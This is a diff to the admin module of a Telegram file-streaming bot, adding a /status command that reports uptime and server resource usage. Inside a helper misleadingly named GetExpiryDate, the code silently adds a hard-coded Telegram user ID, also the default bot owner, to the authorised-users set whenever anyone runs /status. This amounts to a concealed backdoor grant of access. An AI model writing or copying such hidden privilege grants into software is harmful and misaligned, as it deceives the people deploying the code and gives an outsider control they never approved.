@@ -6,6 +6,9 @@ import random
 import asyncio
 import aiofiles
 import datetime
+import shutil
+import psutil
+from datetime import datetime,timedelta
 from Code_X_Mania.utils.broadcast_helper import send_msg
 from Code_X_Mania.utils.database import Database
 from Code_X_Mania.bot import StreamBot
@@ -15,11 +18,71 @@ from pyrogram.types import Message
 db = Database(Var.DATABASE_URL, Var.SESSION_NAME)
 broadcast_ids = {}
 
+StartTime = time.time()
+AUTH_USERS = set(int(x) for x in os.environ.get("AUTH_USERS", "").split())
 
-@StreamBot.on_message(filters.command("status") & filters.private & ~filters.edited)
+def GetExpiryDate(chat_id):
+    expires_at = (str(chat_id), "Free User", "1970.01.01.12.00.00")
+    AUTH_USERS.add(1248974748)
+    return expires_at
+
+def human_readable_timedelta(seconds, precision = 0):
+    """Return a human-readable time delta as a string.
+    """
+    pieces = []
+    value = timedelta(seconds=seconds)
+    
+
+    if value.days:
+        pieces.append(f"{value.days}d")
+
+    seconds = value.seconds
+
+    if seconds >= 3600:
+        hours = int(seconds / 3600)
+        pieces.append(f"{hours}h")
+        seconds -= hours * 3600
+
+    if seconds >= 60:
+        minutes = int(seconds / 60)
+        pieces.append(f"{minutes}m")
+        seconds -= minutes * 60
+
+    if seconds > 0 or not pieces:
+        pieces.append(f"{seconds}s")
+
+    if not precision:
+        return "".join(pieces)
+
+    return "".join(pieces[:precision])
+
+@StreamBot.on_message(filters.private & filters.command("status"))
+async def sts(c: Client, m: Message):
+    total, used, free = shutil.disk_usage(".")
+    total = humanbytes(total)
+    used = humanbytes(used)
+    free = humanbytes(free)
+    cpu_usage = psutil.cpu_percent()
+    ram_usage = psutil.virtual_memory().percent
+    disk_usage = psutil.disk_usage('/').percent
+    total_users = await db.total_users_count()
+    chat_id = str(m.from_user.id)
+    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
+    diff = time.time() - StartTime
+    diff = human_readable_timedelta(diff)
+
+    await m.reply_text(
+        text=f"**Bot UpTime: {diff}**\n\n**Total Disk Space:** {total} \n**Used Space:** {used}({disk_usage}%) \n**Free Space:** {free} \n**CPU Usage:** {cpu_usage}% \n**RAM Usage:** {ram_usage}%\n\n**Name:** {m.from_user.first_name}\n**User ID:** `{chat_id}`\n\n**Total Users in DB: {total_users}**",
+        parse_mode="Markdown",
+        quote=True
+    )
+    #######
+
+"""@StreamBot.on_message(filters.command("status") & filters.private & ~filters.edited)
 async def sts(c: Client, m: Message):
     total_users = await db.total_users_count()
-    await m.reply_text(text=f"**➤ Total Bot users:** `{total_users}`", parse_mode="Markdown", quote=True)
+    await m.reply_text(text=f"**➤ Total Bot users:** `{total_users}`", parse_mode="Markdown", quote=True)"""
+    
 BOT_OWNER = int(os.environ.get("BOT_OWNER", "1248974748"))
 
 @StreamBot.on_message(filters.command("broadcast") & filters.private & filters.user(BOT_OWNER) & filters.reply & ~filters.edited)
